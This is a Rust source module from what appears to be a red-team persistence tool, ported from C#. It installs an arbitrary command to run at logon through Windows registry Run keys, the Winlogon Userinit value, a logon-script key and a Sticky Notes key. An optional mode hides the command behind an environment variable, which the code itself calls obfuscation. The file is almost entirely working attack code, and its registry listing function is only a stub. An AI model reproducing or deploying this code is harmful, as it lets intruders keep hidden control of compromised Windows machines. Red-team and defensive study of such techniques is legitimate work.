//! Registry persistence technique
//!
//! Implements persistence via Windows registry Run keys and related mechanisms.
//! Port of C# RegistryPersist.cs

use crate::core::{
    config::{Method, PersistConfig},
    error::{PersistError, Result},
};
use crate::ffi::windows_registry::{
    map_registry_key, map_registry_value, Hive, RegKey, RegValueKind,
};

/// Check result for dry-run operations
#[derive(Debug)]
pub struct CheckResult {
    pub can_write: bool,
    pub already_exists: bool,
    pub is_predefined_key: bool,
}

/// Registry entry for list operations
#[derive(Debug)]
pub struct RegistryEntry {
    pub name: String,
    pub value: String,
    pub kind: String,
}

/// Execute registry persistence operation
pub fn execute(config: &PersistConfig) -> Result<()> {
    match config.method {
        Method::Add => add_persistence(config),
        Method::Remove => remove_persistence(config),
        Method::Check => {
            let result = check_persistence(config)?;
            print_check_result(&result);
            Ok(())
        }
        Method::List => {
            let entries = list_persistence(config)?;
            print_list_results(&entries);
            Ok(())
        }
    }
}

/// Add registry persistence
fn add_persistence(config: &PersistConfig) -> Result<()> {
    let registry_key = config
        .registry_key
        .as_ref()
        .ok_or_else(|| PersistError::MissingArgument("registry_key".to_string()))?;

    let command = config
        .command
        .as_ref()
        .ok_or_else(|| PersistError::MissingArgument("command".to_string()))?;

    // Check if this is a predefined key
    let is_predefined = map_registry_value(registry_key).is_some();
    let use_env = config.option.as_deref() == Some("env");

    // Environment variable option not supported with predefined keys
    if is_predefined && use_env {
        return Err(PersistError::Other(
            "Environment variable add-on not supported with pre-determined registry values"
                .to_string(),
        ));
    }

    // Get full registry path and hive
    let (hive, subkey) = map_registry_key(registry_key).ok_or_else(|| {
        PersistError::Registry(format!("Invalid registry key shortcut: {}", registry_key))
    })?;

    // Get value name (either from config or mapped predefined value)
    let value_name = if let Some(predefined_value) = map_registry_value(registry_key) {
        predefined_value.to_string()
    } else {
        config
            .registry_value
            .clone()
            .ok_or_else(|| PersistError::MissingArgument("registry_value".to_string()))?
    };

    // Build command with args
    let full_command = if let Some(args) = &config.command_arg {
        format!("{} {}", command, args)
    } else {
        command.clone()
    };

    println!();
    println!("[*] INFO: Adding registry persistence");
    println!("[*] INFO: Command: {}", command);
    println!(
        "[*] INFO: Command Args: {}",
        config.command_arg.as_deref().unwrap_or("")
    );
    println!("[*] INFO: Registry Key: {}\\{}", hive_name(hive), subkey);
    println!("[*] INFO: Registry Value: {}", value_name);
    println!(
        "[*] INFO: Option: {}",
        config.option.as_deref().unwrap_or("")
    );
    println!();

    // Check if value already exists
    let key = RegKey::create(hive, subkey)?;
    let exists = key.value_exists(&value_name);

    if !exists {
        // Value doesn't exist - normal add
        if use_env {
            add_with_env_variable(hive, subkey, &value_name, &full_command)?;
        } else {
            key.set_value(&value_name, &full_command, RegValueKind::String)?;
        }
    } else if is_predefined {
        // Predefined key - special handling
        add_predefined_key(registry_key, hive, subkey, &value_name, &full_command)?;
    } else {
        return Err(PersistError::AlreadyExists(format!(
            "Registry value already exists: {}",
            value_name
        )));
    }

    println!();
    println!("[+] SUCCESS: Registry persistence added");
    Ok(())
}

/// Add persistence with environment variable obfuscation
fn add_with_env_variable(hive: Hive, subkey: &str, value_name: &str, command: &str) -> Result<()> {
    // Determine environment key path based on hive
    let env_subkey = match hive {
        Hive::CurrentUser => "Environment",
        Hive::LocalMachine => "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
    };

    // Check if env value already exists
    let env_key = RegKey::create(hive, env_subkey)?;
    if env_key.value_exists(value_name) {
        return Err(PersistError::AlreadyExists(format!(
            "Environment variable already exists: {}",
            value_name
        )));
    }

    // Set environment variable with command
    env_key.set_value(value_name, command, RegValueKind::ExpandString)?;

    // Set persistence key with reference to env variable
    let key = RegKey::create(hive, subkey)?;
    let env_ref = format!("%{}%", value_name);
    key.set_value(value_name, &env_ref, RegValueKind::ExpandString)?;

    Ok(())
}

/// Add persistence for predefined keys (logonscript, userinit, stickynotes)
fn add_predefined_key(
    key_shortcut: &str,
    hive: Hive,
    subkey: &str,
    value_name: &str,
    command: &str,
) -> Result<()> {
    let key = RegKey::create(hive, subkey)?;

    match key_shortcut.to_lowercase().as_str() {
        "logonscript" => {
            // Set as expandable string
            key.set_value(value_name, command, RegValueKind::ExpandString)?;
        }
        "stickynotes" => {
            // Set as normal string
            key.set_value(value_name, command, RegValueKind::String)?;
        }
        "userinit" => {
            // Must preserve original userinit.exe and append command
            let userinit_value = format!("C:\\Windows\\System32\\userinit.exe,{}", command);
            key.set_value(value_name, &userinit_value, RegValueKind::String)?;
        }
        _ => {
            return Err(PersistError::Other(format!(
                "Unknown predefined key: {}",
                key_shortcut
            )))
        }
    }

    Ok(())
}

/// Remove registry persistence
fn remove_persistence(config: &PersistConfig) -> Result<()> {
    let registry_key = config
        .registry_key
        .as_ref()
        .ok_or_else(|| PersistError::MissingArgument("registry_key".to_string()))?;

    let is_predefined = map_registry_value(registry_key).is_some();
    let use_env = config.option.as_deref() == Some("env");

    let (hive, subkey) = map_registry_key(registry_key).ok_or_else(|| {
        PersistError::Registry(format!("Invalid registry key shortcut: {}", registry_key))
    })?;

    let value_name = if let Some(predefined_value) = map_registry_value(registry_key) {
        predefined_value.to_string()
    } else {
        config
            .registry_value
            .clone()
            .ok_or_else(|| PersistError::MissingArgument("registry_value".to_string()))?
    };

    println!();
    println!("[*] INFO: Removing registry persistence");
    println!("[*] INFO: Registry Key: {}\\{}", hive_name(hive), subkey);
    println!("[*] INFO: Registry Value: {}", value_name);
    println!();

    let key = RegKey::open(hive, subkey, true)?;

    if use_env && !is_predefined {
        // Remove environment variable and registry value
        remove_with_env_variable(hive, subkey, &value_name)?;
    } else if is_predefined {
        // Special handling for predefined keys
        remove_predefined_key(registry_key, hive, subkey, &value_name)?;
    } else {
        // Normal delete
        key.delete_value(&value_name)?;
    }

    println!();
    println!("[+] SUCCESS: Registry persistence removed");
    Ok(())
}

/// Remove persistence with environment variable cleanup
fn remove_with_env_variable(hive: Hive, subkey: &str, value_name: &str) -> Result<()> {
    let env_subkey = match hive {
        Hive::CurrentUser => "Environment",
        Hive::LocalMachine => "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
    };

    // Delete environment variable
    let env_key = RegKey::open(hive, env_subkey, true)?;
    env_key.delete_value(value_name)?;

    // Delete registry value
    let key = RegKey::open(hive, subkey, true)?;
    key.delete_value(value_name)?;

    Ok(())
}

/// Remove persistence for predefined keys
fn remove_predefined_key(
    key_shortcut: &str,
    hive: Hive,
    subkey: &str,
    value_name: &str,
) -> Result<()> {
    let key = RegKey::open(hive, subkey, true)?;

    match key_shortcut.to_lowercase().as_str() {
        "logonscript" | "stickynotes" => {
            // Delete the value
            key.delete_value(value_name)?;
        }
        "userinit" => {
            // Restore to original value
            key.set_value(
                value_name,
                "C:\\Windows\\System32\\userinit.exe",
                RegValueKind::String,
            )?;
        }
        _ => {
            return Err(PersistError::Other(format!(
                "Unknown predefined key: {}",
                key_shortcut
            )))
        }
    }

    Ok(())
}

/// Check if registry persistence can be added (dry-run)
fn check_persistence(config: &PersistConfig) -> Result<CheckResult> {
    let registry_key = config
        .registry_key
        .as_ref()
        .ok_or_else(|| PersistError::MissingArgument("registry_key".to_string()))?;

    let is_predefined = map_registry_value(registry_key).is_some();

    let (hive, subkey) = map_registry_key(registry_key).ok_or_else(|| {
        PersistError::Registry(format!("Invalid registry key shortcut: {}", registry_key))
    })?;

    let value_name = if let Some(predefined_value) = map_registry_value(registry_key) {
        predefined_value.to_string()
    } else {
        config
            .registry_value
            .clone()
            .ok_or_else(|| PersistError::MissingArgument("registry_value".to_string()))?
    };

    // Check if we can write to the key
    let can_write = RegKey::open(hive, subkey, true).is_ok();

    // Check if value already exists
    let already_exists = if let Ok(key) = RegKey::open(hive, subkey, false) {
        key.value_exists(&value_name)
    } else {
        false
    };

    Ok(CheckResult {
        can_write,
        already_exists,
        is_predefined_key: is_predefined,
    })
}

/// List registry values in the specified key
fn list_persistence(config: &PersistConfig) -> Result<Vec<RegistryEntry>> {
    let registry_key = config
        .registry_key
        .as_ref()
        .ok_or_else(|| PersistError::MissingArgument("registry_key".to_string()))?;

    let (hive, subkey) = map_registry_key(registry_key).ok_or_else(|| {
        PersistError::Registry(format!("Invalid registry key shortcut: {}", registry_key))
    })?;

    println!();
    println!(
        "[*] INFO: Listing all registry values in: {}\\{}",
        hive_name(hive),
        subkey
    );
    println!();

    // Note: For full listing, we'd need RegEnumValue API
    // For now, return empty vec as placeholder
    // Full implementation would require additional FFI wrapper

    log::warn!("Registry enumeration not yet fully implemented - returning empty list");
    Ok(vec![])
}

/// Print check result
fn print_check_result(result: &CheckResult) {
    println!();
    println!("[*] INFO: Checking for correct arguments given");
    println!("[+] SUCCESS: Correct arguments given");

    if !result.is_predefined_key {
        println!();
        println!("[*] INFO: Checking if registry key and value supplied already exists");
        if result.already_exists {
            println!("[-] ERROR: Registry key and value already exist");
        } else {
            println!("[+] SUCCESS: Registry key and value do NOT exist");
        }
    }

    println!();
    println!("[*] INFO: Checking if you can write to that registry location");
    if result.can_write {
        println!("[+] SUCCESS: You have write permissions to that registry key");
    } else {
        println!("[-] ERROR: You do NOT have write permissions to that registry key");
    }
}

/// Print list results
fn print_list_results(entries: &[RegistryEntry]) {
    if entries.is_empty() {
        println!("[*] INFO: No entries found (enumeration not yet fully implemented)");
        return;
    }

    for entry in entries {
        println!("[*] INFO: REGISTRY VALUE:");
        println!("{}", entry.name);
        println!();
        println!("[*] INFO: REGISTRY VALUE KIND:");
        println!("{}", entry.kind);
        println!();
        println!("[*] INFO: REGISTRY DATA:");
        println!("{}", entry.value);
        println!();
        println!();
    }
}

/// Helper: Get hive display name
fn hive_name(hive: Hive) -> &'static str {
    match hive {
        Hive::LocalMachine => "HKLM",
        Hive::CurrentUser => "HKCU",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::config::Technique;

    #[test]
    fn test_check_result_structure() {
        let result = CheckResult {
            can_write: true,
            already_exists: false,
            is_predefined_key: false,
        };
        assert!(result.can_write);
        assert!(!result.already_exists);
    }

    #[test]
    fn test_missing_registry_key() {
        let config = PersistConfig {
            technique: Technique::Registry,
            method: Method::Add,
            command: Some("cmd.exe".to_string()),
            command_arg: None,
            registry_key: None, // Missing
            registry_value: Some("Test".to_string()),
            file_path: None,
            name: None,
            option: None,
        };

        let result = add_persistence(&config);
        assert!(matches!(result, Err(PersistError::MissingArgument(_))));
    }
}
